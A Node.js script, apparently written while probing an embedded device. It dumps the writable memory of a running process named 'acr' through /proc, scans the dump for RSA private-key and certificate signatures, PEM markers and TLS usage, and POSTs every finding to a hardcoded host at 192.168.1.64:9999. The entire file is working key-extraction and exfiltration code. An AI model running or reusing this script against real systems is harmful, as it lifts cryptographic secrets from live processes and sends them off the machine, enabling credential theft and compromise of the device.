"use strict";
// audit99.js - scan acr memory for DER RSA key signatures + check TLS connections.
// DER RSA PrivateKeyInfo: 30 82 xx xx 02 01 00 (SEQUENCE + version 0)
// Also scan for OpenSSL BIGNUM patterns (pointer + top + dmax fields).
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

out.pidof = sh("pidof acr", 200);
var pid = trim(out.pidof).match(/^(\d+)/);
pid = pid ? pid[1] : null;
out.pid = pid;

if (!pid) {
    out.status = "NO_ACR";
    post("/p99_diag", out);
    post("/p99_done", { started: out.started });
} else {
    // dump rw memory fresh
    out.dump = sh("cat /proc/" + pid + "/maps | awk '$2 ~ /^rw/ {split($1,a,\"-\"); print a[1], a[2]}' > /tmp/.amap; > /tmp/acr_mem2.bin; while read s e; do ss=$(printf '%d' 0x$s); es=$(printf '%d' 0x$e); sz=$((es-ss)); dd if=/proc/" + pid + "/mem bs=4096 skip=$((ss/4096)) count=$(((sz+4095)/4096)) 2>/dev/null | head -c $sz >> /tmp/acr_mem2.bin; done < /tmp/.amap; ls -la /tmp/acr_mem2.bin", 1500);

    // search for PEM markers (wide net)
    out.pem = sh("grep -aob -e 'BEGIN' -e 'PRIVATE' -e 'Proc-Type' -e 'DEK-Info' /tmp/acr_mem2.bin | head -30", 3000);

    // search for DER RSA key header: 30 82 xx xx 02 01 00
    // use od to hexdump then look for pattern
    out.der_scan = sh("od -A x -t x1 /tmp/acr_mem2.bin | grep -E '30 82 [0-9a-f]{2} [0-9a-f]{2} 02 01 00' | head -20", 3000);

    // search for DER cert header: 30 82 xx xx 30 82
    out.cert_scan = sh("od -A x -t x1 /tmp/acr_mem2.bin | grep -E '30 82 [0-9a-f]{2} [0-9a-f]{2} 30 82' | head -10", 2000);

    // check acr's network connections (is it doing TLS?)
    out.net = sh("cat /proc/net/tcp | grep -c ':01BB'; echo '---'; cat /proc/" + pid + "/net/tcp 2>/dev/null | grep ':01BB' | head -10", 2000);

    // check if acr has loaded libssl (TLS in use)
    out.ssl_maps = sh("cat /proc/" + pid + "/maps | grep -E 'libssl|libcrypto|libVDCurl' | head -8", 1500);

    // strings around any PEM/DER hits
    out.str_scan = sh("strings -t x /tmp/acr_mem2.bin 2>/dev/null | grep -iE 'private.?key|BEGIN|RSA|certificate' | head -20", 2500);
}

post("/p99_scan", out);
post("/p99_done", { started: out.started });
